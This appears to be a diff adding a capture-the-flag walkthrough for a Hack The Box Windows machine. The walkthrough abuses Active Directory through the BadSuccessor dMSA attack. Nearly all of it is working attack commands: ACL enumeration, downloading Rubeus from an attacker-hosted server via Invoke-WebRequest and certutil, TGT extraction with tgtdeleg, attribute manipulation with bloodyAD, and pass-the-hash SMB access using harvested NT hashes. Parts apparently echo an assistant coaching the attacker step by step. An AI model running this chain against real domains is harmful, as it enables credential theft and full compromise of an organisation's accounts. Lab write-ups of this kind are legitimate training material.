@@ -1,0 +1,109 @@
+```
+whoami /all
+[System.Environment]::OSVersion.Version
+Get-ADUser svc_deploy -Properties memberOf | Select-Object DistinguishedName,memberOf
+```
+
+(a) Does ryan/DevTeam actually have write rights over svc_deploy?
+```
+(Get-Acl "AD:\CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb").Access | Where-Object { $_.IdentityReference -match 'ryan|DevTeam' } | Select-Object ActiveDirectoryRights,AccessControlType,IdentityReference
+```
+
+(b) Find the OU where we can create a dMSA (BadSuccessor needs CreateChild on an OU)
+
+```
+  Get-ADOrganizationalUnit -Filter * | Select-Object -ExpandProperty DistinguishedName
+```
+
+(c) Who is actually in BackupAccess (the group that reads VMBackups)?
+```
+Get-ADGroupMember BackupAccess | Select-Object Name,objectClass
+```
+
+
+ All three confirm the path is intact on this instance:
+
+  - ryan.brooks _ **GenericWrite** **on** **svc_deploy** __
+
+  - **OU=DMSAHolder** present _ our dMSA plant location __
+
+  - **BackupAccess** **=** **{** **svc_deploy** **}** __ _ so owning svc_deploy _does_ get us VMBackups/.vmem (the earlier empty memberOf was just the AD module not echoing it; Get-ADGroupMember is authoritative).
+    
+  Download Rubeus
+```
+Invoke-WebRequest "http://10.10.15.131:8000/Rubeus.exe" -OutFile "R.exe"
+certutil -urlcache -f http://10.10.15.131:8000/Rubeus.exe R.exe
+```
+
+  # extract a usable TGT for ryan.brooks via GSS delegation (no creds required)
+```
+.\R.exe tgtdeleg /nowrap
+```
+`tgtdeleg` will print a **base64** **blob** (the ryan TGT, a `.kirbi`). Copy that entire blob _ it's the credential we'll convert to a ccache on Kali and feed to the BadSuccessor attack.
+
+  
+
+  When you paste the base64 back here, I'll give you Step 4 (convert it to a ccache and run BadSuccessor against svc_deploy).
+
+
+  faketime wrapper for the +7h DC skew (Kerberos auth needs it)
+```
+FT() { LD_PRELOAD=/tmp/libfaketime/src/libfaketime.so.1 FAKETIME="+7h" \
+bloodyAD --host DC01.checkpoint.htb --dc-ip $IP -d checkpoint.htb -u ryan.brooks -k "$@"; }
+```
+
+
+
+  **Step** **1** **_** **Decode** **the** **base64** **TGT** **_** **.kirbi** **(output** **on** **sda1)**
+
+```
+cd /home/p0p3ye/htb/season11/4_checkpoint_win_medium
+source .venv/bin/activate
+export IP=10.129.15.4
+export LOOT=/home/p0p3ye/data/checkpoint_loot
+export TMPDIR=/home/p0p3ye/data/tmp
+export KRB5CCNAME=$LOOT/ryan.ccache
+```
+
+```
+tr -d ' \t\r\n' < privesc/svc_tgt.b64 | base64 -d > $LOOT/ryan.kirbi 
+xxd $LOOT/ryan.kirbi | head -1
+```
+
+
+**Step** **2** **_** **Convert** **.kirbi** **_** **ccache**                                                                                                                                                                             
+
+```
+/usr/bin/python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py \
+$LOOT/ryan.kirbi $LOOT/ryan.ccache
+```
+
+  _(The_ _/usr/bin/impacket-*_ _wrappers_ _are_ _broken_ _on_ _this_ _box_ ___ _call_ _the_ _example_ _script_ _with_ _system_ _python.)
+
+
+  **Step** **3** **_** **BadSuccessor:** **hijack** **svc_deploy** **via** **a** **dMSA**
+
+```
+FT set object CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb msDS-SupersededManagedAccountLink
+FT set object CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb msDS-SupersededServiceAccountState
+
+FT remove object CN=pwn1,OU=DMSAHolder,DC=checkpoint,DC=htb
+```
+
+```
+cd $LOOT
+
+FT add badSuccessor pwn1 \
+-t CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb \
+--ou OU=DMSAHolder,DC=checkpoint,DC=htb
+```
+  Read the output: **dMSA** **previous** **keys** **_** **RC4:** **`<hash>` is svc_deploy's NT hash
+
+HASH: e16081eb077aca74bdbf8af12af43ac9
+
+```
+smbclient //10.129.12.228/C$ -U 'checkpoint.htb\svc_deploy' --pw-nt-hash --password="e16081eb077aca74bdbf8af12af43ac9" 
+```
+
+
+AHASH=f29e9c014295b9b32139b09a2790be3b
